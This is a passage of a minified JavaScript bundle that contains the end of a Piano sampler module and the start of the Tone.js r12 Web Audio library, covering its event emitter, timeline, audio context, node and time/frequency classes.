t(t,e){for(var n=0;n<e.length;n++){var r=e[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,r.key,r)}}return function(e,n,r){return n&&t(e.prototype,n),r&&t(e,r),e}}(),a=n(0),u=r(a),c=r(n(6)),l=n(5),h=r(n(4)),p=r(n(7));r(n(1)),e.Piano=function(t){function e(){i(this,e);var t=u.default.defaults(arguments,["range","velocities"],{velocities:1,range:[21,108],release:!0}),n=o(this,(e.__proto__||Object.getPrototypeOf(e)).call(this));return n.createInsOuts(0,1),n._loaded=!1,n._heldNotes=new Map,n._sustainedNotes=new Map,n._notes=new l.Notes(t.range,t.velocities).connect(n.output),n._pedal=(new c.default).connect(n.output),t.release&&(n._harmonics=new h.default(t.range).connect(n.output),n._release=new p.default(t.range).connect(n.output)),n}return function(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function, not "+typeof e);t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}),e&&(Object.setPrototypeOf?Object.setPrototypeOf(t,e):t.__proto__=e)}(e,t),s(e,[{key:"load",value:function(){var t=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"https://tambien.github.io/Piano/Salamander/",n=[this._notes.load(e),this._pedal.load(e)];return this._harmonics&&n.push(this._harmonics.load(e)),this._release&&n.push(this._release.load(e)),Promise.all(n).then((function(){t._loaded=!0}))}},{key:"pedalDown",value:function(t){return this.loaded&&(t=this.toSeconds(t),this._pedal.isDown(t)||this._pedal.down(t)),this}},{key:"pedalUp",value:function(t){var e=this;return this.loaded&&(t=this.toSeconds(t),this._pedal.isDown(t)&&(this._pedal.up(t),this._sustainedNotes.forEach((function(n,r){e._heldNotes.has(r)||e._notes.stop(r,t)})),this._sustainedNotes.clear())),this}},{key:"keyDown",value:function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:u.default.now(),n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:.8;return this.loaded&&(e=this.toSeconds(e),u.default.isString(t)&&(t=Math.round((0,a.Frequency)(t).toMidi())),this._heldNotes.has(t)||(this._heldNotes.set(t,{time:e,velocity:n}),this._notes.start(t,e,n))),this}},{key:"keyUp",value:function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:u.default.now(),n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:.8;if(this.loaded&&(e=this.toSeconds(e),u.default.isString(t)&&(t=Math.round((0,a.Frequency)(t).toMidi())),this._heldNotes.has(t))){var r=this._heldNotes.get(t);this._heldNotes.delete(t),this._release&&this._release.start(t,e,n);var i=e-r.time,o=r.velocity,s=.5/Math.max(i,.1)+o+n;s=Math.pow(Math.log(Math.max(s,1)),2)/2,this._pedal.isDown(e)?this._sustainedNotes.has(t)||this._sustainedNotes.set(t,e):(this._notes.stop(t,e,n),this._harmonics&&this._harmonics.start(t,e,s))}return this}},{key:"setVolume",value:function(t,e){switch(t){case"note":this._notes.volume=e;break;case"pedal":this._pedal.volume=e;break;case"release":this._release&&(this._release.volume=e);break;case"harmonics":this._harmonics&&(this._harmonics.volume=e)}return this}},{key:"stopAll",value:function(){var t=this;return this.pedalUp(),this._heldNotes.forEach((function(e,n){t.keyUp(n)})),this}},{key:"progress",value:function(t){return a.Buffer.on("progress",t),this}},{key:"loaded",get:function(){return this._loaded}}]),e}(a.AudioNode)}])},"object"==typeof n&&"object"==typeof e?e.exports=i(t("tone")):"object"==typeof n?n.Piano=i(t("tone")):r.Piano=i(r.tone)},{tone:155}],155:[function(t,e,n){var r,i;r=this,i=function(){"use strict";var t,e;function n(e){e(t)}
/**
	 *  Tone.js
	 *  @author Yotam Mann
	 *  @license http://opensource.org/licenses/MIT MIT License
	 *  @copyright 2014-2018 Yotam Mann
	 */return e=function(){var t=function(){if(!(this instanceof t))throw new Error("constructor needs to be called with the 'new' keyword")};t.prototype.toString=function(){for(var e in t){var n=e[0].match(/^[A-Z]$/),r=t[e]===this.constructor;if(t.isFunction(t[e])&&n&&r)return e}return"Tone"},t.prototype.dispose=function(){return this},t.prototype.set=function(e,n,r){if(t.isObject(e))r=n;else if(t.isString(e)){var i={};i[e]=n,e=i}t:for(var o in e){n=e[o];var s=this;if(-1!==o.indexOf(".")){for(var a=o.split("."),u=0;u<a.length-1;u++)if((s=s[a[u]])instanceof t){a.splice(0,u+1);var c=a.join(".");s.set(c,n);continue t}o=a[a.length-1]}var l=s[o];t.isUndef(l)||(t.Signal&&l instanceof t.Signal||t.Param&&l instanceof t.Param?l.value!==n&&(t.isUndef(r)?l.value=n:l.rampTo(n,r)):l instanceof AudioParam?l.value!==n&&(l.value=n):t.TimeBase&&l instanceof t.TimeBase?s[o]=n:l instanceof t?l.set(n):l!==n&&(s[o]=n))}return this},t.prototype.get=function(e){t.isUndef(e)?e=this._collectDefaults(this.constructor):t.isString(e)&&(e=[e]);for(var n={},r=0;r<e.length;r++){var i=e[r],o=this,s=n;if(-1!==i.indexOf(".")){for(var a=i.split("."),u=0;u<a.length-1;u++){var c=a[u];s[c]=s[c]||{},s=s[c],o=o[c]}i=a[a.length-1]}var l=o[i];t.isObject(e[i])?s[i]=l.get():t.Signal&&l instanceof t.Signal||t.Param&&l instanceof t.Param||l instanceof AudioParam?s[i]=l.value:l instanceof t?s[i]=l.get():!t.isFunction(l)&&t.isDefined(l)&&(s[i]=l)}return n},t.prototype._collectDefaults=function(e){var n=[];if(t.isDefined(e.defaults)&&(n=Object.keys(e.defaults)),t.isDefined(e._super))for(var r=this._collectDefaults(e._super),i=0;i<r.length;i++)-1===n.indexOf(r[i])&&n.push(r[i]);return n},t.defaults=function(e,n,r){var i={};if(1===e.length&&t.isObject(e[0]))i=e[0];else for(var o=0;o<n.length;o++)i[n[o]]=e[o];return t.isDefined(r.defaults)?t.defaultArg(i,r.defaults):t.isObject(r)?t.defaultArg(i,r):i},t.defaultArg=function(e,n){if(t.isObject(e)&&t.isObject(n)){var r={};for(var i in e)r[i]=t.defaultArg(n[i],e[i]);for(var o in n)r[o]=t.defaultArg(e[o],n[o]);return r}return t.isUndef(e)?n:e},t.connectSeries=function(){for(var e=arguments[0],n=1;n<arguments.length;n++){var r=arguments[n];e.connect(r),e=r}return t},t.isUndef=function(t){return void 0===t},t.isDefined=function(e){return!t.isUndef(e)},t.isFunction=function(t){return"function"==typeof t},t.isNumber=function(t){return"number"==typeof t},t.isObject=function(t){return"[object Object]"===Object.prototype.toString.call(t)&&t.constructor===Object},t.isBoolean=function(t){return"boolean"==typeof t},t.isArray=function(t){return Array.isArray(t)},t.isString=function(t){return"string"==typeof t},t.isNote=function(e){return t.isString(e)&&/^([a-g]{1}(?:b|#|x|bb)?)(-?[0-9]+)/i.test(e)},t.noOp=function(){},t.prototype._readOnly=function(t){if(Array.isArray(t))for(var e=0;e<t.length;e++)this._readOnly(t[e]);else Object.defineProperty(this,t,{writable:!1,enumerable:!0})},t.prototype._writable=function(t){if(Array.isArray(t))for(var e=0;e<t.length;e++)this._writable(t[e]);else Object.defineProperty(this,t,{writable:!0})},t.State={Started:"started",Stopped:"stopped",Paused:"paused"},t.equalPowerScale=function(t){var e=.5*Math.PI;return Math.sin(t*e)},t.dbToGain=function(t){return Math.pow(10,t/20)},t.gainToDb=function(t){return Math.log(t)/Math.LN10*20},t.intervalToFrequencyRatio=function(t){return Math.pow(2,t/12)},t.prototype.now=function(){return t.context.now()},t.now=function(){return t.context.now()},t.extend=function(e,n){function r(){}t.isUndef(n)&&(n=t),r.prototype=n.prototype,e.prototype=new r,e.prototype.constructor=e,e._super=n};var e=null;return Object.defineProperty(t,"context",{get:function(){return e},set:function(n){e=t.Context&&n instanceof t.Context?n:new t.Context(n),t.Context.emit("init",e)}}),Object.defineProperty(t.prototype,"context",{get:function(){return t.context}}),t.setContext=function(e){t.context=e},Object.defineProperty(t.prototype,"blockTime",{get:function(){return 128/this.context.sampleRate}}),Object.defineProperty(t.prototype,"sampleTime",{get:function(){return 1/this.context.sampleRate}}),Object.defineProperty(t,"supported",{get:function(){var t=window.hasOwnProperty("AudioContext")||window.hasOwnProperty("webkitAudioContext"),e=window.hasOwnProperty("Promise"),n=window.hasOwnProperty("Worker");return t&&e&&n}}),Object.defineProperty(t,"initialized",{get:function(){return null!==e}}),t.getContext=function(e){if(t.initialized)e(t.context);else{var n=function(){e(t.context),t.Context.off("init",n)};t.Context.on("init",n)}return t},t.version="r12",t},t=e(),n((function(t){return t.Emitter=function(){t.call(this),this._events={}},t.extend(t.Emitter),t.Emitter.prototype.on=function(t,e){for(var n=t.split(/\W+/),r=0;r<n.length;r++){var i=n[r];this._events.hasOwnProperty(i)||(this._events[i]=[]),this._events[i].push(e)}return this},t.Emitter.prototype.once=function(t,e){var n=function(){e.apply(this,arguments),this.off(t,n)}.bind(this);return this.on(t,n),this},t.Emitter.prototype.off=function(e,n){for(var r=e.split(/\W+/),i=0;i<r.length;i++)if(e=r[i],this._events.hasOwnProperty(e))if(t.isUndef(n))this._events[e]=[];else for(var o=this._events[e],s=0;s<o.length;s++)o[s]===n&&o.splice(s,1);return this},t.Emitter.prototype.emit=function(t){if(this._events){var e=Array.apply(null,arguments).slice(1);if(this._events.hasOwnProperty(t))for(var n=this._events[t].slice(0),r=0,i=n.length;r<i;r++)n[r].apply(this,e)}return this},t.Emitter.mixin=function(e){var n=["on","once","off","emit"];e._events={};for(var r=0;r<n.length;r++){var i=n[r],o=t.Emitter.prototype[i];e[i]=o}return t.Emitter},t.Emitter.prototype.dispose=function(){return t.prototype.dispose.call(this),this._events=null,this},t.Emitter})),n((function(t){return t.Timeline=function(){var e=t.defaults(arguments,["memory"],t.Timeline);t.call(this),this._timeline=[],this.memory=e.memory},t.extend(t.Timeline),t.Timeline.defaults={memory:1/0},Object.defineProperty(t.Timeline.prototype,"length",{get:function(){return this._timeline.length}}),t.Timeline.prototype.add=function(e){if(t.isUndef(e.time))throw new Error("Tone.Timeline: events must have a time attribute");e.time=e.time.valueOf();var n=this._search(e.time);if(this._timeline.splice(n+1,0,e),this.length>this.memory){var r=this.length-this.memory;this._timeline.splice(0,r)}return this},t.Timeline.prototype.remove=function(t){var e=this._timeline.indexOf(t);return-1!==e&&this._timeline.splice(e,1),this},t.Timeline.prototype.get=function(e,n){n=t.defaultArg(n,"time");var r=this._search(e,n);return-1!==r?this._timeline[r]:null},t.Timeline.prototype.peek=function(){return this._timeline[0]},t.Timeline.prototype.shift=function(){return this._timeline.shift()},t.Timeline.prototype.getAfter=function(e,n){n=t.defaultArg(n,"time");var r=this._search(e,n);return r+1<this._timeline.length?this._timeline[r+1]:null},t.Timeline.prototype.getBefore=function(e,n){n=t.defaultArg(n,"time");var r=this._timeline.length;if(r>0&&this._timeline[r-1][n]<e)return this._timeline[r-1];var i=this._search(e,n);return i-1>=0?this._timeline[i-1]:null},t.Timeline.prototype.cancel=function(t){if(this._timeline.length>1){var e=this._search(t);if(e>=0)if(this._timeline[e].time===t){for(var n=e;n>=0&&this._timeline[n].time===t;n--)e=n;this._timeline=this._timeline.slice(0,e)}else this._timeline=this._timeline.slice(0,e+1);else this._timeline=[]}else 1===this._timeline.length&&this._timeline[0].time>=t&&(this._timeline=[]);return this},t.Timeline.prototype.cancelBefore=function(t){var e=this._search(t);return e>=0&&(this._timeline=this._timeline.slice(e+1)),this},t.Timeline.prototype.previousEvent=function(t){var e=this._timeline.indexOf(t);return e>0?this._timeline[e-1]:null},t.Timeline.prototype._search=function(e,n){if(0===this._timeline.length)return-1;n=t.defaultArg(n,"time");var r=0,i=this._timeline.length,o=i;if(i>0&&this._timeline[i-1][n]<=e)return i-1;for(;r<o;){var s=Math.floor(r+(o-r)/2),a=this._timeline[s],u=this._timeline[s+1];if(a[n]===e){for(var c=s;c<this._timeline.length;c++)this._timeline[c][n]===e&&(s=c);return s}if(a[n]<e&&u[n]>e)return s;a[n]>e?o=s:r=s+1}return-1},t.Timeline.prototype._iterate=function(e,n,r){n=t.defaultArg(n,0),r=t.defaultArg(r,this._timeline.length-1),this._timeline.slice(n,r+1).forEach(function(t){e.call(this,t)}.bind(this))},t.Timeline.prototype.forEach=function(t){return this._iterate(t),this},t.Timeline.prototype.forEachBefore=function(t,e){var n=this._search(t);return-1!==n&&this._iterate(e,0,n),this},t.Timeline.prototype.forEachAfter=function(t,e){var n=this._search(t);return this._iterate(e,n+1),this},t.Timeline.prototype.forEachBetween=function(t,e,n){var r=this._search(t),i=this._search(e);return-1!==r&&-1!==i?(this._timeline[r].time!==t&&(r+=1),this._timeline[i].time===e&&(i-=1),this._iterate(n,r,i)):-1===r&&this._iterate(n,0,i),this},t.Timeline.prototype.forEachFrom=function(t,e){for(var n=this._search(t);n>=0&&this._timeline[n].time>=t;)n--;return this._iterate(e,n+1),this},t.Timeline.prototype.forEachAtTime=function(t,e){var n=this._search(t);return-1!==n&&this._iterate((function(n){n.time===t&&e.call(this,n)}),0,n),this},t.Timeline.prototype.dispose=function(){return t.prototype.dispose.call(this),this._timeline=null,this},t.Timeline})),n((function(t){t.supported&&(!window.hasOwnProperty("OfflineAudioContext")&&window.hasOwnProperty("webkitOfflineAudioContext")&&(window.OfflineAudioContext=window.webkitOfflineAudioContext),new OfflineAudioContext(1,1,44100).startRendering()instanceof Promise||(OfflineAudioContext.prototype._native_startRendering=OfflineAudioContext.prototype.startRendering,OfflineAudioContext.prototype.startRendering=function(){return new Promise(function(t){this.oncomplete=function(e){t(e.renderedBuffer)},this._native_startRendering()}.bind(this))}))})),n((function(t){if(t.supported){!window.hasOwnProperty("AudioContext")&&window.hasOwnProperty("webkitAudioContext")&&(window.AudioContext=window.webkitAudioContext),AudioContext.prototype.close||(AudioContext.prototype.close=function(){return t.isFunction(this.suspend)&&this.suspend(),Promise.resolve()}),AudioContext.prototype.resume||(AudioContext.prototype.resume=function(){return Promise.resolve()}),!AudioContext.prototype.createGain&&AudioContext.prototype.createGainNode&&(AudioContext.prototype.createGain=AudioContext.prototype.createGainNode),!AudioContext.prototype.createDelay&&AudioContext.prototype.createDelayNode&&(AudioContext.prototype.createDelay=AudioContext.prototype.createDelayNode);var e=!1,n=new OfflineAudioContext(1,1,44100),r=new Uint32Array([1179011410,48,1163280727,544501094,16,131073,44100,176400,1048580,1635017060,8,0,0,0,0]).buffer;try{n.decodeAudioData(r)instanceof Promise&&(e=!0)}catch(t){e=!1}e||(AudioContext.prototype._native_decodeAudioData=AudioContext.prototype.decodeAudioData,AudioContext.prototype.decodeAudioData=function(t){return new Promise(function(e,n){this._native_decodeAudioData(t,e,n)}.bind(this))})}})),n((function(t){t.Context=function(){t.Emitter.call(this);var n=t.defaults(arguments,["context"],t.Context);if(!n.context&&(n.context=new window.AudioContext,!n.context))throw new Error("could not create AudioContext. Possibly too many AudioContexts running already.");for(var r in this._context=n.context,this._context)this._defineProperty(this._context,r);this._latencyHint=n.latencyHint,this._constants={},this.lookAhead=n.lookAhead,this._computedUpdateInterval=0,this._ticker=new e(this.emit.bind(this,"tick"),n.clockSource,n.updateInterval),this._timeouts=new t.Timeline,this._timeoutIds=0,this.on("tick",this._timeoutLoop.bind(this))},t.extend(t.Context,t.Emitter),t.Emitter.mixin(t.Context),t.Context.defaults={clockSource:"worker",latencyHint:"interactive",lookAhead:.1,updateInterval:.03},t.Context.prototype._defineProperty=function(e,n){t.isUndef(this[n])&&Object.defineProperty(this,n,{get:function(){return"function"==typeof e[n]?e[n].bind(e):e[n]},set:function(t){e[n]=t}})},t.Context.prototype.now=function(){return this._context.currentTime+this.lookAhead},t.Context.prototype.ready=function(){return new Promise(function(t){"running"===this._context.state?t():this._context.resume().then((function(){t()}))}.bind(this))},t.Context.prototype.close=function(){return this._context.close().then(function(){t.Context.emit("close",this)}.bind(this))},t.Context.prototype.getConstant=function(t){if(this._constants[t])return this._constants[t];for(var e=this._context.createBuffer(1,128,this._context.sampleRate),n=e.getChannelData(0),r=0;r<n.length;r++)n[r]=t;var i=this._context.createBufferSource();return i.channelCount=1,i.channelCountMode="explicit",i.buffer=e,i.loop=!0,i.start(0),this._constants[t]=i,i},t.Context.prototype._timeoutLoop=function(){for(var t=this.now();this._timeouts&&this._timeouts.length&&this._timeouts.peek().time<=t;)this._timeouts.shift().callback()},t.Context.prototype.setTimeout=function(t,e){this._timeoutIds++;var n=this.now();return this._timeouts.add({callback:t,time:n+e,id:this._timeoutIds}),this._timeoutIds},t.Context.prototype.clearTimeout=function(t){return this._timeouts.forEach((function(e){e.id===t&&this.remove(e)})),this},Object.defineProperty(t.Context.prototype,"updateInterval",{get:function(){return this._ticker.updateInterval},set:function(t){this._ticker.updateInterval=t}}),Object.defineProperty(t.Context.prototype,"clockSource",{get:function(){return this._ticker.type},set:function(t){this._ticker.type=t}}),Object.defineProperty(t.Context.prototype,"latencyHint",{get:function(){return this._latencyHint},set:function(e){var n=e;if(this._latencyHint=e,t.isString(e))switch(e){case"interactive":n=.1,this._context.latencyHint=e;break;case"playback":n=.8,this._context.latencyHint=e;break;case"balanced":n=.25,this._context.latencyHint=e;break;case"fastest":this._context.latencyHint="interactive",n=.01}this.lookAhead=n,this.updateInterval=n/3}}),t.Context.prototype.dispose=function(){return this.close().then(function(){for(var e in t.Emitter.prototype.dispose.call(this),this._ticker.dispose(),this._ticker=null,this._timeouts.dispose(),this._timeouts=null,this._constants)this._constants[e].disconnect();this._constants=null}.bind(this))};var e=function(e,n,r){this._type=n,this._updateInterval=r,this._callback=t.defaultArg(e,t.noOp),this._createClock()};return e.Type={Worker:"worker",Timeout:"timeout",Offline:"offline"},e.prototype._createWorker=function(){window.URL=window.URL||window.webkitURL;var t=new Blob(["var timeoutTime = "+(1e3*this._updateInterval).toFixed(1)+";self.onmessage = function(msg){\ttimeoutTime = parseInt(msg.data);};function tick(){\tsetTimeout(tick, timeoutTime);\tself.postMessage('tick');}tick();"]),e=URL.createObjectURL(t),n=new Worker(e);n.onmessage=this._callback.bind(this),this._worker=n},e.prototype._createTimeout=function(){this._timeout=setTimeout(function(){this._createTimeout(),this._callback()}.bind(this),1e3*this._updateInterval)},e.prototype._createClock=function(){if(this._type===e.Type.Worker)try{this._createWorker()}catch(t){this._type=e.Type.Timeout,this._createClock()}else this._type===e.Type.Timeout&&this._createTimeout()},Object.defineProperty(e.prototype,"updateInterval",{get:function(){return this._updateInterval},set:function(t){this._updateInterval=Math.max(t,128/44100),this._type===e.Type.Worker&&this._worker.postMessage(Math.max(1e3*t,1))}}),Object.defineProperty(e.prototype,"type",{get:function(){return this._type},set:function(t){this._disposeClock(),this._type=t,this._createClock()}}),e.prototype._disposeClock=function(){this._timeout&&(clearTimeout(this._timeout),this._timeout=null),this._worker&&(this._worker.terminate(),this._worker.onmessage=null,this._worker=null)},e.prototype.dispose=function(){this._disposeClock(),this._callback=null},t.getContext((function(){var e=AudioNode.prototype.connect,n=AudioNode.prototype.disconnect;function r(n,r,i){if(n.input)return i=t.defaultArg(i,0),t.isArray(n.input)?this.connect(n.input[i]):this.connect(n.input,r,i);try{return n instanceof AudioNode?(e.call(this,n,r,i),n):(e.call(this,n,r),n)}catch(t){throw new Error("error connecting to node: "+n+"\n"+t)}}AudioNode.prototype.connect!==r&&(AudioNode.prototype.connect=r,AudioNode.prototype.disconnect=function(e,r,i){if(e&&e.input&&t.isArray(e.input))i=t.defaultArg(i,0),this.disconnect(e.input[i],r,0);else if(e&&e.input)this.disconnect(e.input,r,i);else try{n.apply(this,arguments)}catch(t){throw new Error("error disconnecting node: "+e+"\n"+t)}})})),t.supported&&!t.initialized?(t.context=new t.Context,window.TONE_SILENCE_VERSION_LOGGING||console.log("%c * Tone.js "+t.version+" * ","background: #000; color: #fff")):t.supported||console.warn("This browser does not support Tone.js"),t.Context})),n((function(t){return t.AudioNode=function(){t.call(this);var e=t.defaults(arguments,["context"],{context:t.context});this._context=e.context},t.extend(t.AudioNode),Object.defineProperty(t.AudioNode.prototype,"context",{get:function(){return this._context}}),t.AudioNode.prototype.createInsOuts=function(t,e){1===t?this.input=this.context.createGain():t>1&&(this.input=new Array(t)),1===e?this.output=this.context.createGain():e>1&&(this.output=new Array(e))},Object.defineProperty(t.AudioNode.prototype,"channelCount",{get:function(){return this.output.channelCount},set:function(t){return this.output.channelCount=t}}),Object.defineProperty(t.AudioNode.prototype,"channelCountMode",{get:function(){return this.output.channelCountMode},set:function(t){return this.output.channelCountMode=t}}),Object.defineProperty(t.AudioNode.prototype,"channelInterpretation",{get:function(){return this.output.channelInterpretation},set:function(t){return this.output.channelInterpretation=t}}),Object.defineProperty(t.AudioNode.prototype,"numberOfInputs",{get:function(){return this.input?t.isArray(this.input)?this.input.length:1:0}}),Object.defineProperty(t.AudioNode.prototype,"numberOfOutputs",{get:function(){return this.output?t.isArray(this.output)?this.output.length:1:0}}),t.AudioNode.prototype._onConnect=function(){},t.AudioNode.prototype.connect=function(e,n,r){return e._onConnect&&e._onConnect(this),t.isArray(this.output)?(n=t.defaultArg(n,0),this.output[n].connect(e,0,r)):this.output.connect(e,n,r),this},t.AudioNode.prototype.disconnect=function(e,n,r){t.isArray(this.output)?t.isNumber(e)?this.output[e].disconnect():(n=t.defaultArg(n,0),this.output[n].disconnect(e,0,r)):this.output.disconnect.apply(this.output,arguments)},t.AudioNode.prototype.chain=function(){for(var t=this,e=0;e<arguments.length;e++){var n=arguments[e];t.connect(n),t=n}return this},t.AudioNode.prototype.fan=function(){for(var t=0;t<arguments.length;t++)this.connect(arguments[t]);return this},window.AudioNode&&(AudioNode.prototype.chain=t.AudioNode.prototype.chain,AudioNode.prototype.fan=t.AudioNode.prototype.fan),t.AudioNode.prototype.dispose=function(){return t.isDefined(this.input)&&(this.input instanceof AudioNode&&this.input.disconnect(),this.input=null),t.isDefined(this.output)&&(this.output instanceof AudioNode&&this.output.disconnect(),this.output=null),this._context=null,this},t.AudioNode})),n((function(t){return t.SignalBase=function(){t.AudioNode.call(this)},t.extend(t.SignalBase,t.AudioNode),t.SignalBase.prototype.connect=function(e,n,r){return t.Signal&&t.Signal===e.constructor||t.Param&&t.Param===e.constructor?(e._param.cancelScheduledValues(0),e._param.value=0,e.overridden=!0):e instanceof AudioParam&&(e.cancelScheduledValues(0),e.value=0),t.AudioNode.prototype.connect.call(this,e,n,r),this},t.SignalBase})),n((function(t){if(t.supported){var e=navigator.userAgent.toLowerCase();if(e.includes("safari")&&!e.includes("chrome")){var n=function(t){for(var e in this._internalNode=this.input=this.output=t._native_createWaveShaper(),this._curve=null,this._internalNode)this._defineProperty(this._internalNode,e)};Object.defineProperty(n.prototype,"curve",{get:function(){return this._curve},set:function(t){this._curve=t;var e=new Float32Array(t.length+1);e.set(t,1),e[0]=t[0],this._internalNode.curve=e}}),n.prototype._defineProperty=function(e,n){t.isUndef(this[n])&&Object.defineProperty(this,n,{get:function(){return"function"==typeof e[n]?e[n].bind(e):e[n]},set:function(t){e[n]=t}})},AudioContext.prototype._native_createWaveShaper=AudioContext.prototype.createWaveShaper,AudioContext.prototype.createWaveShaper=function(){return new n(this)}}}})),n((function(t){return t.WaveShaper=function(e,n){t.SignalBase.call(this),this._shaper=this.input=this.output=this.context.createWaveShaper(),this._curve=null,Array.isArray(e)?this.curve=e:isFinite(e)||t.isUndef(e)?this._curve=new Float32Array(t.defaultArg(e,1024)):t.isFunction(e)&&(this._curve=new Float32Array(t.defaultArg(n,1024)),this.setMap(e))},t.extend(t.WaveShaper,t.SignalBase),t.WaveShaper.prototype.setMap=function(t){for(var e=new Array(this._curve.length),n=0,r=this._curve.length;n<r;n++){var i=n/(r-1)*2-1;e[n]=t(i,n)}return this.curve=e,this},Object.defineProperty(t.WaveShaper.prototype,"curve",{get:function(){return this._shaper.curve},set:function(t){this._curve=new Float32Array(t),this._shaper.curve=this._curve}}),Object.defineProperty(t.WaveShaper.prototype,"oversample",{get:function(){return this._shaper.oversample},set:function(t){if(!["none","2x","4x"].includes(t))throw new RangeError("Tone.WaveShaper: oversampling must be either 'none', '2x', or '4x'");this._shaper.oversample=t}}),t.WaveShaper.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._shaper.disconnect(),this._shaper=null,this._curve=null,this},t.WaveShaper})),n((function(t){return t.TimeBase=function(e,n){if(!(this instanceof t.TimeBase))return new t.TimeBase(e,n);if(this._val=e,this._units=n,t.isUndef(this._units)&&t.isString(this._val)&&parseFloat(this._val)==this._val&&"+"!==this._val.charAt(0))this._val=parseFloat(this._val),this._units=this._defaultUnits;else if(e&&e.constructor===this.constructor)this._val=e._val,this._units=e._units;else if(e instanceof t.TimeBase)switch(this._defaultUnits){case"s":this._val=e.toSeconds();break;case"i":this._val=e.toTicks();break;case"hz":this._val=e.toFrequency();break;case"midi":this._val=e.toMidi();break;default:throw new Error("Unrecognized default units "+this._defaultUnits)}},t.extend(t.TimeBase),t.TimeBase.prototype._expressions={n:{regexp:/^(\d+)n(\.?)$/i,method:function(t,e){var n="."===e?1.5:1;return 1===(t=parseInt(t))?this._beatsToUnits(this._getTimeSignature())*n:this._beatsToUnits(4/t)*n}},t:{regexp:/^(\d+)t$/i,method:function(t){return t=parseInt(t),this._beatsToUnits(8/(3*parseInt(t)))}},m:{regexp:/^(\d+)m$/i,method:function(t){return this._beatsToUnits(parseInt(t)*this._getTimeSignature())}},i:{regexp:/^(\d+)i$/i,method:function(t){return this._ticksToUnits(parseInt(t))}},hz:{regexp:/^(\d+(?:\.\d+)?)hz$/i,method:function(t){return this._frequencyToUnits(parseFloat(t))}},tr:{regexp:/^(\d+(?:\.\d+)?):(\d+(?:\.\d+)?):?(\d+(?:\.\d+)?)?$/,method:function(t,e,n){var r=0;return t&&"0"!==t&&(r+=this._beatsToUnits(this._getTimeSignature()*parseFloat(t))),e&&"0"!==e&&(r+=this._beatsToUnits(parseFloat(e))),n&&"0"!==n&&(r+=this._beatsToUnits(parseFloat(n)/4)),r}},s:{regexp:/^(\d+(?:\.\d+)?)s$/,method:function(t){return this._secondsToUnits(parseFloat(t))}},samples:{regexp:/^(\d+)samples$/,method:function(t){return parseInt(t)/this.context.sampleRate}},default:{regexp:/^(\d+(?:\.\d+)?)$/,method:function(t){return this._expressions[this._defaultUnits].method.call(this,t)}}},t.TimeBase.prototype._defaultUnits="s",t.TimeBase.prototype._getBpm=function(){return t.Transport?t.Transport.bpm.value:120},t.TimeBase.prototype._getTimeSignature=function(){return t.Transport?t.Transport.timeSignature:4},t.TimeBase.prototype._getPPQ=function(){return t.Transport?t.Transport.PPQ:192},t.TimeBase.prototype._now=function(){return this.now()},t.TimeBase.prototype._frequencyToUnits=function(t){return 1/t},t.TimeBase.prototype._beatsToUnits=function(t){return 60/this._getBpm()*t},t.TimeBase.prototype._secondsToUnits=function(t){return t},t.TimeBase.prototype._ticksToUnits=function(t){return t*(this._beatsToUnits(1)/this._getPPQ())},t.TimeBase.prototype._noArg=function(){return this._now()},t.TimeBase.prototype.valueOf=function(){if(t.isUndef(this._val))return this._noArg();if(t.isString(this._val)&&t.isUndef(this._units))for(var e in this._expressions)if(this._expressions[e].regexp.test(this._val.trim())){this._units=e;break}if(t.isDefined(this._units)){var n=this._expressions[this._units],r=this._val.toString().trim().match(n.regexp);return r?n.method.apply(this,r.slice(1)):n.method.call(this,parseFloat(this._val))}return this._val},t.TimeBase.prototype.toSeconds=function(){return this.valueOf()},t.TimeBase.prototype.toFrequency=function(){return 1/this.toSeconds()},t.TimeBase.prototype.toSamples=function(){return this.toSeconds()*this.context.sampleRate},t.TimeBase.prototype.toMilliseconds=function(){return 1e3*this.toSeconds()},t.TimeBase.prototype.dispose=function(){this._val=null,this._units=null},t.TimeBase})),n((function(t){t.Frequency=function(e,n){if(!(this instanceof t.Frequency))return new t.Frequency(e,n);t.TimeBase.call(this,e,n)},t.extend(t.Frequency,t.TimeBase),t.Frequency.prototype._expressions=Object.assign({},t.TimeBase.prototype._expressions,{midi:{regexp:/^(\d+(?:\.\d+)?midi)/,method:function(e){return"midi"===this._defaultUnits?e:t.Frequency.mtof(e)}},note:{regexp:/^([a-g]{1}(?:b|#|x|bb)?)(-?[0-9]+)/i,method:function(n,r){var i=e[n.toLowerCase()]+12*(parseInt(r)+1);return"midi"===this._defaultUnits?i:t.Frequency.mtof(i)}},tr:{regexp:/^(\d+(?:\.\d+)?):(\d+(?:\.\d+)?):?(\d+(?:\.\d+)?)?/,method:function(t,e,n){var r=1;return t&&"0"!==t&&(r*=this._beatsToUnits(this._getTimeSignature()*parseFloat(t))),e&&"0"!==e&&(r*=this._beatsToUnits(parseFloat(e))),n&&"0"!==n&&(r*=this._beatsToUnits(parseFloat(n)/4)),r}}}),t.Frequency.prototype.transpose=function(e){return new this.constructor(this.valueOf()*t.intervalToFrequencyRatio(e))},t.Frequency.prototype.harmonize=function(t){return t.map(function(t){return this.transpose(t)}.bind(this))},t.Frequency.prototype.toMidi=function(){return t.Frequency.ftom(this.valueOf())},t.Frequency.prototype.toNote=function(){var e=this.toFrequency(),r=Math.log2(e/t.Frequency.A4),i=Math.round(12*r)+57,o=Math.floor(i/12);return o<0&&(i+=-12*o),n[i%12]+o.toString()},t.Frequency.prototype.toSeconds=function(){return 1/t.TimeBase.prototype.toSeconds.call(this)},t.Frequency.prototype.toFrequency=function(){return t.TimeBase.prototype.toFrequency.call(this)},t.Frequency.prototype.toTicks=function(){var e=this._beatsToUnits(1),n=this.valueOf()/e;return Math.floor(n*t.Transport.PPQ)},t.Frequency.prototype._noArg=function(){return 0},t.Frequency.prototype._frequencyToUnits=function(t){return t},t.Frequency.prototype._ticksToUnits=function(e){return 1/(60*e/(t.Transport.bpm.value*t.Transport.PPQ))},t.Frequency.prototype._beatsToUnits=function(e){return 